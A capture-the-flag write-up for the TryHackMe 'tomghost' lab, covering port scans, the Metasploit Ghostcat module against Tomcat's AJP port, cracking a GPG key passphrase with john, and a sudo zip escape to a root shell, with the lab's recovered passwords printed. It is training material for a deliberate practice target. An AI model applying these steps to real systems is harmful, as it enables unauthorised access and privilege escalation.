# [Challenge](https://tryhackme.com/room/tomghost)

- # ENUM 
	- ### nmap(`nmap -p- -A -T4 tomghost`)
			```PORT     STATE SERVICE    REASON  VERSION
			22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
			| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
			|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
			| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
			|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
			|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
			53/tcp   open  tcpwrapped syn-ack
			8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3)
			| ajp-methods: 
			|_  Supported methods: GET HEAD POST OPTIONS
			8080/tcp open  http       syn-ack Apache Tomcat 9.0.30
			|_http-title: Apache Tomcat/9.0.30
			|_http-favicon: Apache Tomcat
			| http-methods: 
			|_  Supported Methods: GET HEAD POST OPTIONS
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://tomghost:8080/ -x .html,.txt,.js,.php -t 300`)
		- #### DIRECTORIES
			- `/docs`
			-  `/examples`
			- `/manager`

- # EXPLOITATION
	- On port 8009, we haev AJP. Let's search for an exploit:
		- `msfconsole` -> `admin/http/tomcat_ghostcat`
			- `skyfuck:8730281lkjlkjdqlksalks`
	- Cool, these credentials work on SSH!

- # PRIVILEGE ESCALATION
	- We have 2 files: `credential.pgp` (text) & `tryhackme.asc` (key, protected by password).
		- Let's crack the password with john: `gpg2john tryhackme.asc > hash.txt` -> `john hash.txt` -> `alexandru`
	- `gpg --import tryhackme.asc` -> `gpg --decrypt credential.pgp`
		- `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j` Finally, we got merlin's password!
	- `sudo -l` -> We can run as root `/usr/bin/zip`! Let's check GTFOBins: `TF=$(mktemp -u)` -> `sudo zip $TF /etc/hosts -T -TT 'sh #'` -> `sudo rm $TF`
		- We're ROOT!
